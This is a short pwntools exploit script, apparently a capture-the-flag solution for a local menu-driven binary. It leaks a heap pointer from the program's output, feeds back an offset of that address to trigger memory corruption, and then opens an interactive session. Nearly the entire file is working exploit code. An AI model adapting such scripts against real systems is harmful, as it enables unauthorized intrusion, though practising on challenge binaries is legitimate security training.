#!/usr/bin/env python3

from pwn import *

exe = ELF("./main")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote('127.0.0.1', 5156)

    return r

def add_client(r):
    r.sendlineafter(b'> ', b'1')
    r.sendafter(b': ', b'A'*16)
    r.sendafter(b': ', b'A'*16)

def main():
    r = conn()

    add_client(r)
    add_client(r)
    add_client(r)

    r.sendlineafter(b'> ', b'2')
    r.recvline()
    res = r.recvline()
    leak = int(res[len(res)-7:-1][::-1].hex(),16)
    
    print(f'leak heap chunk: {hex(leak)}')
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', hex(leak+40)[2:].encode('utf-8')) # remove 0x
    
    r.sendlineafter(b'> ', b'4')

    r.interactive()


if __name__ == "__main__":
    main()
